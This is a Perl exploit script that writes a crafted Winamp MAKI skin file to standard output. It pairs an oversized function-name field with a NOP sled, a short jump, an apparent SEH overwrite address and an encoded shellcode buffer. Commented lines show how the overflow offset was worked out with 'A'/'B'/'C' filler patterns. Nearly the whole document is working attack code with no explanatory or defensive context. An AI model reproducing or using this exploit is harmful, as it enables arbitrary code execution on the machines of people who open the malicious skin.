#!/usr/bin/perl

binmode STDOUT;

$| = 1;

$length = "\xFF\xFF";

my $buf = 
"\xda\xd3\xd9\x74\x24\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a" .
"\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a" .
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42" .
"\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75" .
"\x4a\x49\x6b\x4c\x6a\x48\x4e\x62\x55\x50\x37\x70\x45\x50" .
"\x45\x30\x6b\x39\x78\x65\x70\x31\x79\x50\x32\x44\x4e\x6b" .
"\x46\x30\x30\x30\x4c\x4b\x42\x72\x46\x6c\x4e\x6b\x51\x42" .
"\x44\x54\x4e\x6b\x73\x42\x35\x78\x74\x4f\x4e\x57\x62\x6a" .
"\x67\x56\x34\x71\x39\x6f\x4e\x4c\x65\x6c\x61\x71\x61\x6c" .
"\x53\x32\x46\x4c\x71\x30\x4f\x31\x78\x4f\x56\x6d\x46\x61" .
"\x69\x57\x59\x72\x49\x62\x43\x62\x72\x77\x6c\x4b\x51\x42" .
"\x74\x50\x4e\x6b\x61\x5a\x47\x4c\x6e\x6b\x72\x6c\x74\x51" .
"\x70\x78\x6a\x43\x53\x78\x46\x61\x7a\x71\x30\x51\x6c\x4b" .
"\x31\x49\x57\x50\x46\x61\x6b\x63\x6c\x4b\x50\x49\x44\x58" .
"\x79\x73\x56\x5a\x47\x39\x6e\x6b\x57\x44\x4c\x4b\x43\x31" .
"\x6e\x36\x65\x61\x59\x6f\x6c\x6c\x4f\x31\x78\x4f\x46\x6d" .
"\x66\x61\x4f\x37\x74\x78\x69\x70\x71\x65\x4a\x56\x34\x43" .
"\x71\x6d\x69\x68\x75\x6b\x73\x4d\x77\x54\x51\x65\x69\x74" .
"\x63\x68\x6c\x4b\x63\x68\x51\x34\x33\x31\x58\x53\x73\x56" .
"\x6c\x4b\x36\x6c\x30\x4b\x6c\x4b\x30\x58\x75\x4c\x37\x71" .
"\x6b\x63\x6e\x6b\x65\x54\x4e\x6b\x45\x51\x6a\x70\x6f\x79" .
"\x63\x74\x66\x44\x76\x44\x61\x4b\x43\x6b\x45\x31\x52\x79" .
"\x61\x4a\x53\x61\x79\x6f\x69\x70\x63\x6f\x61\x4f\x33\x6a" .
"\x6c\x4b\x77\x62\x48\x6b\x4c\x4d\x63\x6d\x73\x58\x75\x63" .
"\x30\x32\x53\x30\x75\x50\x51\x78\x64\x37\x61\x63\x65\x62" .
"\x33\x6f\x63\x64\x63\x58\x32\x6c\x42\x57\x44\x66\x74\x47" .
"\x6b\x4f\x6e\x35\x48\x38\x4e\x70\x67\x71\x55\x50\x53\x30" .
"\x71\x39\x78\x44\x51\x44\x66\x30\x52\x48\x46\x49\x6d\x50" .
"\x42\x4b\x57\x70\x39\x6f\x4a\x75\x36\x30\x66\x30\x42\x70" .
"\x32\x70\x63\x70\x36\x30\x53\x70\x56\x30\x33\x58\x78\x6a" .
"\x64\x4f\x4b\x6f\x39\x70\x4b\x4f\x79\x45\x4f\x67\x33\x5a" .
"\x37\x75\x62\x48\x53\x4f\x65\x50\x77\x70\x57\x71\x62\x48" .
"\x37\x72\x77\x70\x47\x65\x4c\x73\x4f\x79\x4a\x46\x72\x4a" .
"\x74\x50\x50\x56\x32\x77\x42\x48\x6c\x59\x39\x35\x74\x34" .
"\x71\x71\x6b\x4f\x7a\x75\x4c\x45\x6b\x70\x54\x34\x54\x4c" .
"\x6b\x4f\x32\x6e\x56\x68\x44\x35\x6a\x4c\x63\x58\x58\x70" .
"\x4f\x45\x4f\x52\x50\x56\x4b\x4f\x78\x55\x35\x38\x53\x53" .
"\x52\x4d\x62\x44\x33\x30\x4e\x69\x6a\x43\x52\x77\x53\x67" .
"\x32\x77\x66\x51\x58\x76\x42\x4a\x42\x32\x62\x79\x71\x46" .
"\x6a\x42\x79\x6d\x53\x56\x6f\x37\x63\x74\x51\x34\x65\x6c" .
"\x73\x31\x77\x71\x4e\x6d\x73\x74\x45\x74\x46\x70\x4a\x66" .
"\x63\x30\x71\x54\x62\x74\x36\x30\x46\x36\x70\x56\x46\x36" .
"\x47\x36\x72\x76\x50\x4e\x46\x36\x62\x76\x46\x33\x66\x36" .
"\x70\x68\x50\x79\x68\x4c\x45\x6f\x4c\x46\x79\x6f\x58\x55" .
"\x6b\x39\x59\x70\x52\x6e\x43\x66\x32\x66\x39\x6f\x64\x70" .
"\x31\x78\x46\x68\x4c\x47\x35\x4d\x65\x30\x6b\x4f\x6b\x65" .
"\x6f\x4b\x68\x70\x58\x35\x4d\x72\x70\x56\x75\x38\x6d\x76" .
"\x7a\x35\x6d\x6d\x4d\x4d\x69\x6f\x69\x45\x55\x6c\x45\x56" .
"\x73\x4c\x65\x5a\x6b\x30\x39\x6b\x79\x70\x64\x35\x45\x55" .
"\x6d\x6b\x31\x57\x72\x33\x51\x62\x30\x6f\x63\x5a\x55\x50" .
"\x52\x73\x4b\x4f\x49\x45\x41\x41";


#$function_name = "A" x 20000;
#$function_name = 'A' x 5000 . 'B' x 5000 . 'C' x 5000;

# Path to text file
#my $file_path = 'C:/Program Files/Winamp/Skins/Bento/scripts/pattern5k.txt';

# Open the file and read its contents
#open my $fh, '<', $file_path or die "Could not open file '$file_path': $!";
#my $file_content = do { local $/; <$fh> };
#close $fh;

# Append the content of the file to your string
#$function_name .= $file_content;


#$function_name = 'A' x 16756 . 'B'

 x 4 . 'C' x 4 . 'A' x 3240;

$function_name = "\x90" x 16756 . "\x90\x90\xEB\x06" . "\x7f\x3b\x37\x7c" . "\x90" x 20 . $buf . "\x90" x 2508;





my $maki =
"\x46\x47" .                              # Magic
"\x03\x04" .                              # Version
"\x17\x00\x00\x00" .                      # ???
"\x01\x00\x00\x00" .                      # Types count
"\x71\x49\x65\x51\x87\x0D\x51\x4A" .      # Types
"\x91\xE3\xA6\xB5\x32\x35\xF3\xE7" .

"\x01\x00\x00\x00".                       # Function count
"\x01\x01" .                              # Function 1
"\x00\x00" .                              # Dummy

$length .                                 # Length
$function_name;

print $maki;
